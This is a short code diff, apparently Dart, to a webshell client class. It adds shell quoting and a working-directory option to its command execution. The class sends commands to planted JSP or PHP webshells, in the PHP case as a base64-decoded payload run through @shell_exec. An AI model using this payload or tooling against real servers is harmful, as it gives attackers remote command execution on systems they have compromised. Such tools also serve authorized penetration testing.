@@ -183,16 +183,25 @@ class WebshellService {
     }
   }
 
-  /// 执行 Shell 命令（使用 base64 编码命令避免转义问题）
-  Future<String> executeCommand(String cmd) async {
+  /// Shell 单引号安全转义
+  static String _shellQuote(String s) => "'${s.replaceAll("'", "'\\''")}'";
+
+  /// 执行 Shell 命令
+  /// [workingDir] 非空时，前缀 `cd <dir> && ` 以在目标目录内执行
+  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
+    final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
+        ? 'cd ${_shellQuote(workingDir)} && '
+        : '';
+    final fullCmd = '$cd$cmd';
+
     if (_isJsp) {
       final result = await _sendJsp(
         'exec',
-        extraParams: {'_k': _execKey, _execKey: cmd},
+        extraParams: {'_k': _execKey, _execKey: fullCmd},
       );
       return result.trim();
     } else {
-      final b64 = base64.encode(utf8.encode(cmd));
+      final b64 = base64.encode(utf8.encode(fullCmd));
       final result = await _send(
         "\$c=base64_decode('$b64');"
         r"$o=@shell_exec($c.' 2>&1');"
